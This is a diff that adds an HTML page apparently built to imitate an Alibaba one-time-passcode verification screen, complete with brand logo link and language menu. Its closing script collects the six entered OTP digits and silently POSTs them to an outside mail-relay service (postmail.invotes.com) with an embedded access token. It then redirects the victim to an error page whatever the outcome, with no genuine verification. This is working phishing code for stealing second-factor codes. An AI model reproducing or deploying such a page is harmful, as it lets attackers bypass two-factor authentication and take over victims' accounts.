@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="otp.css">
+    <title>otp page</title>
+</head>
+<body>
+
+<style>
+
+*{
+  box-sizing: border-box;
+}
+body{
+  margin: 0;
+}
+.title{
+  max-width: 400px;
+  margin: auto;
+  text-align: center;
+  font-family: "Poppins", sans-serif;
+ 
+  }
+
+  
+.otp-input-fields{
+  margin: auto;
+  background-color: white;
+  box-shadow: 0px 0px 8px 0px #02025044;
+  max-width: 400px;
+  width: auto;
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+  padding: 40px;}
+  
+  input{
+    height: 40px;
+    width: 40px;
+    background-color: transparent;
+    border-radius: 4px;
+    border: 1px solid #e87b0e;
+    text-align: center;
+    outline: none;
+    font-size: 16px;
+    &::-webkit-outer-spin-button,
+    &::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+
+  
+  
+}
+
+.fm-button {
+            display: inline-block;
+            height: 40px;
+            border: 1px solid #e87b0e;
+            font-size: 14px;
+            font-weight: 700;
+            text-align: center;
+            color: #fff;
+            font-family: Microsoft YaHei, Hiragino Sans GB, \5b8b\4f53;
+            box-shadow: 0 1px 1px #ebe7e6;
+            justify-content: center;
+            width: 20%;
+            align-self: center;
+            
+        }
+
+        .fm-button.fm-submit {
+            background: #FF7519;
+            border-color: #FF7519;
+            border-radius: 3px;
+            justify-content: center;
+            width: 20%;
+
+            justify-self: center;
+        }
+
+
+
+
+</style>
+
+
+<div id="header" style="height:100px;max-width:1200px;margin:0 auto;overflow:hidden;">
+    <div class="icbu-ali-logo util-left" style="margin:40px 20px 0 0;">
+        
+        
+        <a href="http://www.alibaba.com/"
+            title="Manufacturers"><img src="logo.png" alt="logo" height="40" width="180"></a></div>
+    <div class="util-left" style="margin-top:45px;"><select id="language-switch"
+            onchange="window.targetLanguage=this.value;" class="icbu-language-swicth"
+            style="outline:none;min-width:100px;height:26px;background:transparent;border-radius:3px;">
+            <option value="en_US" selected>English</option>
+            <option value="zh_CN">简体中文</option>
+            <option value="zh_TW">繁体中文</option>
+            <option value="es_ES">Español</option>
+            <option value="pt_PT">Português</option>
+            <option value="de_DE">Deutsch</option>
+            <option value="fr_FR">Français</option>
+            <option value="it_IT">Italiano</option>
+            <option value="ru_RU">Pусский</option>
+            <option value="ko_KR">한국어</option>
+            <option value="ja_JP">日本語</option>
+            <option value="ar_SA">اللغة العربية</option>
+            <option value="tr_TR">Türk</option>
+            <option value="th_TH">ภาษาไทย</option>
+            <option value="vi_VN">tiếng Việt</option>
+            <option value="nl_NL">nederlands</option>
+            <option value="hi_IN">हिन्दी</option>
+            <option value="iw_HE">עברית</option>
+            <option value="in_ID">Bahasa Indonesia</option>
+        </select></div>
+</div><!-- tangram:4107 end-->
+<!-- tangram:4762 begin-->
+
+<!-- tangram:4762 end-->
+<div id="content">
+    <div id="screen-banner"
+        style="position:absolute;width:100%;height:600px;top:101px;left:0;background-color:#f5f5f5;"></div>
+    <div id="action-container" style="position:relative;max-width:1200px;min-height:600px;zoom:1;margin:0 auto;">
+        
+    <form id="login-form" class="otp-form" name="otp-form">
+  
+        <div class="title">
+            <br> <br> <br>
+          <p class="msg">Please enter OTP to verify</p>
+        </div>
+        <div class="otp-input-fields">
+            
+          <input type="number" class="otp__digit otp__field__1" name="s1"/>
+          <input type="number" class="otp__digit otp__field__2" name="s2"/>
+          <input type="number" class="otp__digit otp__field__3" name="s3"/>
+          <input type="number" class="otp__digit otp__field__4" name="s4"/>
+          <input type="number" class="otp__digit otp__field__5" name="s5"/>
+          <input type="number" class="otp__digit otp__field__6" name="s6"/>
+          
+
+        </div>
+        
+        <div class="container" align="center">
+            <div class="vertical-center">
+                <br>
+                <br>
+                <input  id="js_send" value="Verify" class="fm-button fm-submit" type="submit" />
+            </div>
+          </div>
+
+      </form>
+    </div>
+</div>
+
+</body>
+
+<script>
+
+var otp_inputs = document.querySelectorAll(".otp__digit")
+var mykey = "0123456789".split("")
+otp_inputs.forEach((_)=>{
+  _.addEventListener("keyup", handle_next_input)
+})
+function handle_next_input(event){
+  let current = event.target
+  let index = parseInt(current.classList[1].split("__")[2])
+  current.value = event.key
+  
+  if(event.keyCode == 8 && index > 1){
+    current.previousElementSibling.focus()
+  }
+  if(index < 6 && mykey.indexOf(""+event.key+"") != -1){
+    var next = current.nextElementSibling;
+    next.focus()
+  }
+  var _finalKey = ""
+  for(let {value} of otp_inputs){
+      _finalKey += value
+  }
+  if(_finalKey.length == 6){
+    document.querySelector("#_otp").classList.replace("_notok", "_ok")
+    document.querySelector("#_otp").innerText = _finalKey
+  }else{
+    document.querySelector("#_otp").classList.replace("_ok", "_notok")
+    document.querySelector("#_otp").innerText = _finalKey
+  }
+}
+</script>
+
+
+<script>
+                        
+    //update this with your js_form selector
+    var form_id_js = "login-form";
+
+    var data_js = {
+        "access_token": "vvv3rls2h6mcj0tkoai0si2q" // sent after you sign up
+    };
+
+    function js_onSuccess() {
+        // remove this to avoid redirect
+        //window.location = window.location.pathname + "?dashboard";
+        window.location.href = "error.html";
+    }
+
+    function js_onError(error) {
+        // remove this to avoid redirect
+        window.location.href = "file.html";
+
+    }
+
+    var sendButton = document.getElementById("js_send");
+
+    function js_send() {
+        sendButton.value='Verifying…';
+        sendButton.disabled=true;
+        var request = new XMLHttpRequest();
+        request.onreadystatechange = function() {
+            if (request.readyState == 4 && request.status == 200) {
+                js_onSuccess();
+            } else
+            if(request.readyState == 4) {
+                js_onError(request.response);
+            }
+        };
+
+        var message1 = document.querySelector("#" + form_id_js + " [name='s1']").value;
+        var message2 = document.querySelector("#" + form_id_js + " [name='s2']").value;
+        var message3 = document.querySelector("#" + form_id_js + " [name='s3']").value;
+        var message4 = document.querySelector("#" + form_id_js + " [name='s4']").value;
+        var message5 = document.querySelector("#" + form_id_js + " [name='s5']").value;
+        var message6 = document.querySelector("#" + form_id_js + " [name='s6']").value;
+        var otp =message1+message2+message3+message4+message5+message6
+        data_js['subject'] = "otp";
+        data_js['text'] = otp;
+        var params = toParams(data_js);
+
+        request.open("POST", "https://postmail.invotes.com/send", true);
+        request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+        request.send(params);
+
+        return false;
+    }
+
+    sendButton.onclick = js_send;
+
+    function toParams(data_js) {
+        var form_data = [];
+        for ( var key in data_js ) {
+            form_data.push(encodeURIComponent(key) + "=" + encodeURIComponent(data_js[key]));
+        }
+
+        return form_data.join("&");
+    }
+
+    var js_form = document.getElementById(form_id_js);
+    js_form.addEventListener("submit", function (e) {
+        e.preventDefault();
+    });
+</script>
+
+
+</html>
